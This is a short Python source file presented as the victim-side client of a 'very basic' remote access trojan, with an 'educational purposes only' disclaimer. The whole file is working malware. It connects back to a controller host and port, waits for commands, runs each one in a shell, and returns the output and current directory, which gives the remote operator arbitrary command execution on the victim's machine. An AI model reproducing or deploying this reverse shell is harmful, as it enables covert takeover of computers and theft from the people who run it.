# client software for my very basic python RAT
# client = run on victim
# by cayden wright
# educational purposes only
# 3 January 2023

import socket
import os
import subprocess

HOST = "127.0.0.1"  # The server's hostname or IP address
PORT = 1234  # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    # send current working directory
    working_directory = os.getcwd()
    s.sendall(working_directory.encode('utf-8'))
    while True:
        # get command to run
        command_to_run = s.recv(1024).decode('utf-8')
        # exit case
        if command_to_run == "stop_client":
            command_output = "client_stopped".encode('utf-8')
            s.sendall(command_output)
            exit()
        # cd case (change directory and send back cwd)
        if command_to_run[:2] == 'cd':
            try:
                os.chdir(command_to_run[3:])
                command_output = os.getcwd().encode('utf-8')
            except FileNotFoundError as error:
                command_output = str(error).encode('utf-8')
            s.sendall(command_output)
        else:
            # else just run the command
            command_output = subprocess.getoutput(command_to_run)
            # send output
            command_output = command_output.encode('utf-8')
            s.sendall(command_output)
        # send current working directory
        working_directory = os.getcwd()
        s.sendall(working_directory.encode('utf-8'))
